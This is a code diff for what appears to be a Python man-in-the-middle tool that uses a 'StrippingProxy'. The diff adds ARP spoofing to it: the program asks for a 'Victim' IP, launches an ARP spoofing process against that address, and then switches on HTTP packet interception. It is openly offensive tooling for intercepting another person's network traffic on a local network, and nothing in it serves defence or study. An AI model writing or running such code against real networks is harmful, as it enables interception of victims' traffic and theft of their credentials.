@@ -4,6 +4,9 @@ import logging
 from twisted.internet import reactor
 from twisted.web import http
 
+from arpspoof import ARP
+from multiprocessing import Process
+
 from StrippingProxy import StrippingProxy
 
 
@@ -42,12 +45,21 @@ class Setting:
         cls._disable_intercept_http_packet()
 
 
+def run_arp(victim_ip):
+    arp = ARP(victim_ip)
+    arp.run()
+
+
 def main():
     if 0 == os.getuid():
         pass
     else:
         print("We need root permission")
         exit()
+
+    victim_ip = input("Victim: ")
+    arp_process = Process(target=run_arp, args=(victim_ip, ))
+    arp_process.start()
 
     Setting.on()
 
@@ -67,6 +79,8 @@ def main():
     except KeyboardInterrupt:
         print("Bye~")
         Setting.off()
+        # escape process
+        arp_process.join()
 
 
 if __name__ == '__main__':
